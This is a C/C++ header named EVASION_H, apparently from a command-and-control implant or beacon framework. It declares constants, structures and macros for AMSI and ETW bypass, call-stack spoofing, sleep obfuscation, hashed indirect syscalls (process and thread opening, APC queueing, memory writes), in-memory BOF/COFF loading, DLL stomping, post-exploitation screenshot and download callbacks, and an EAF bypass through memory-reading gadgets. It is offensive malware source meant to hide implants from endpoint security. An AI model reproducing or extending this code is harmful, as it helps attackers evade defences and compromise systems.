#ifndef EVASION_H
#define EVASION_H

#define DOTNET_BYPASS_NONE 0x000
#define DOTNET_BYPASS_EXIT 0x200
#define DOTNET_BYPASS_ALL  0x100
#define DOTNET_BYPASS_ETW  0x400
#define DOTNET_BYPASS_AMSI 0x700

/* =========== [ Spoof ] ========= */

struct _FRAME_INFO {
    UPTR Ptr;  // pointer to function + offset
    UPTR Size; // stack size
};
typedef _FRAME_INFO FRAME_INFO;

struct _GADGET_INFO {
    UPTR Ptr;  // pointer to gadget
    UPTR Size; // stack size
};
typedef _GADGET_INFO GADGET_INFO;

struct _STACK_FRAME {
    WCHAR* DllPath;
    ULONG  Offset;
    ULONG  TotalSize;
    BOOL   ReqLoadLib;
    BOOL   SetsFramePtr;
    PVOID  ReturnAddress;
    BOOL   PushRbp;
    ULONG  CountOfCodes;
    BOOL   PushRbpIdx;
};
typedef _STACK_FRAME STACK_FRAME;

#define OBF_JMP( i, p ) \
    if ( JmpBypass == SLEEPOBF_BYPASS_JMPRAX ) {   \
        Ctx[i].Rax = (U_PTR)( p );                 \
    } if ( JmpBypass == SLEEPOBF_BYPASS_JMPRBX ) { \
        Ctx[i].Rbx = (U_PTR)( & p );               \
    } else {                                       \
        Ctx[i].Rip = (U_PTR)( p );                 \
    }

/* ======== [ Syscalls ] ======== */

#define SY_SEED   0xEDB88320
#define SY_UP     -12
#define SY_DOWN   12
#define SY_RANGE  0xE5

enum Sys {
    Alloc,
    Protect,
    Write,
    Read,
    Free,
    CreateTd,
    QueueApc,
    OpenTd,
    OpenProc,
    MapView,
    CreateSection,
    OpenPrToken,
    OpenThToken,
    SetCtxThread,
    GetCtxThread,
    Last
};

typedef struct {
    ULONG ssn;
    ULONG Hash;
    UPTR  Address;
    UPTR  Instruction;
} EXT, *PEXT;

enum eMask {
    Timer = 1,
    Pooling,
    None
};

enum eChainLogic {
    Default,
    Stomping1,
    Stomping2
};

enum eJmpReg {
    vRax = 0xE0,
    vRsi = 0xE6,
    vRbx = 0x23
};

/* ========= [ Coff ] ========= */

#define COFF_VAR 0x10
#define COFF_FNC 0x20
#define COFF_IMP 0x30

#define CALLBACK_OUTPUT          0x0
#define CALLBACK_OUTPUT_OEM      0x1e
#define CALLBACK_OUTPUT_UTF8     0x20
#define CALLBACK_ERROR           0x0d
#define CALLBACK_NO_PRE_MSG      0x4f
#define CALLBACK_CUSTOM          0x1000
#define CALLBACK_CUSTOM_LAST     0x13ff
#define CALLBACK_AX_SCREENSHOT   0x81
#define CALLBACK_AX_DOWNLOAD_MEM 0x82

struct _DATA_STORE {
    INT32  Type;
    BOOL   IsAsync;
    UINT64 Hash;
    BOOL   Masked;
    CHAR*  Buffer;
    SIZE_T Length;

    struct {
        HANDLE           ThreadHandle;
        ULONG            ThreadId;
        HANDLE           Stop;
        CRITICAL_SECTION CriticalSection;
    } Async;
};
typedef _DATA_STORE DATA_STORE;

#define DATA_STORE_TYPE_EMPTY        0
#define DATA_STORE_TYPE_GENERAL_FILE 1
#define DATA_STORE_TYPE_DOTNET       2
#define DATA_STORE_TYPE_PE           3
#define DATA_STORE_TYPE_BOF          4

struct _USER_DATA {
    CHAR*  Key;
    PVOID  Ptr;
    struct _USER_DATA* Next;
};
typedef _USER_DATA VALUE_DICT;

typedef struct {
    PVOID Base;
    ULONG Size;
} SECTION_DATA;

typedef struct {
    PCHAR Name;
    ULONG Hash;
    UINT8 Type; // ( COFF_VAR | COFF_FNC | COFF_IMP )
    ULONG Rva;
    PVOID Ptr;
    INT16 SectionNumber;
} SYMBOL_DATA;

typedef struct {
    SYMBOL_DATA*  Sym;
    SECTION_DATA* Sec;
} COFF_DATA;

typedef struct _COFF_MAPPED {
    PVOID       MmBase;
    ULONG       MmSize;
    PVOID       EntryPoint;
    COFF_DATA   CoffData;
    ULONG       SecNbrs;
    ULONG       SymNbrs;
    BOOL        IsObfuscated;      // tracks obfuscation state
    PVOID*      ExecSections;      // array of executable section bases
    ULONG*      ExecSizes;         // array of executable section sizes
    ULONG       ExecCount;         // number of executable sections
} COFF_MAPPED, *PCOFF_MAPPED;

struct _COFF_SHARED {
    HANDLE PipeRead;
    HANDLE PipeWrite;

    HANDLE Event;

    ULONG Cmd;
    PCHAR Id;

    byte* Args;
    int   Argc;
};
typedef _COFF_SHARED COFF_SHARED;

struct _BOF_OBJ {
    PVOID MmBegin;
    PVOID MmEnd;
    PVOID Entry;

    HANDLE Thread;

    COFF_MAPPED* Mapped;
    COFF_SHARED* Shared;

    struct _BOF_OBJ* Next;
};
typedef _BOF_OBJ BOF_OBJ;

#define POSTEX_LIST_HANDLE      "\x66\x55\x44\x77"
#define POSTEX_COUNT_HANDLE     "\x77\x44\x55\x66"

struct STOMP_DLL_INFO {
    HMODULE DllHandle;
    PVOID   Base;
    ULONG   TextRVA;
    PVOID   TextStart;
    ULONG   TextSize;
    ULONG   FullSize;
    CHAR*   DllNamec;
    WCHAR*  DllNamew;
    CHAR*   DllPathc;
    WCHAR*  DllPathw;
    PVOID   DllBackup;
    PVOID   BeaconBackup;
};
typedef STOMP_DLL_INFO* PSTOMP_DLL_INFO;

struct CHAIN_DATA {
    ULONG   Time;
    UINT16* Iterator;

    STOMP_DLL_INFO* StompInfo;
    STOMP_DLL_INFO* StompInfoNext;

    struct {
        HANDLE Start;
        HANDLE End;
    } Event;

    struct {
        CONTEXT* Main;
        CONTEXT* Spoof;
        CONTEXT* Backup;
        CONTEXT* Obf;
    } Context;

    HANDLE MainThread;
};

auto ReadMmByGadget( UPTR Ptr, UPTR Gadget ) -> UPTR;

#ifndef KH_EAF_BYPASS
#define KH_EAF_BYPASS 1
#endif // KH_EAF_BYPASS

#if defined(KH_EAF_BYPASS) && (KH_EAF_BYPASS == 1)
#define MM_GADGET_READ_08( x ) ((UINT8 )(UPTR)ReadMmByGadget( (UPTR)x, Self->Config.Evasion.EafGadget ))
#define MM_GADGET_READ_16( x ) ((UINT16)(UPTR)ReadMmByGadget( (UPTR)x, Self->Config.Evasion.EafGadget ))
#define MM_GADGET_READ_32( x ) ((UINT32)(UPTR)ReadMmByGadget( (UPTR)x, Self->Config.Evasion.EafGadget ))
#define MM_GADGET_READ_64( x ) ((UINT64)(UPTR)ReadMmByGadget( (UPTR)x, Self->Config.Evasion.EafGadget ))
#else
#define MM_GADGET_READ_08( x ) 
#define MM_GADGET_READ_16( x ) 
#define MM_GADGET_READ_32( x ) 
#define MM_GADGET_READ_64( x ) 
#endif

#endif // EVASION_H